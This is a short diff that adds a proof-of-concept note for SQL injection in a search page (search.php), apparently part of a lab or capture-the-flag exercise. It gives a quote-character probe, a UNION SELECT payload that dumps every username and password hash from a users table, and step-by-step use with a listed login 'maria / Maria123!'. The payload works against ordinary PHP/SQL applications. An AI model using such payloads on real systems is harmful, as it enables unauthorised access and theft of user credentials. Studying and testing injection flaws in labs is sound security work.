@@ -1,0 +1,12 @@
+Login bypass is not used here (login is Andria's). This PoC targets search.php.
+
+1. Confirm injectable (SQL error leaks):
+   ' 
+
+2. Dump all users (username + password hash):
+   ') UNION SELECT id, username, password_hash FROM users#
+
+Steps:
+- Log in as maria / Maria123!
+- Go to Search, paste the payload above, hit Search
+- Every user's hash appears as a "note"
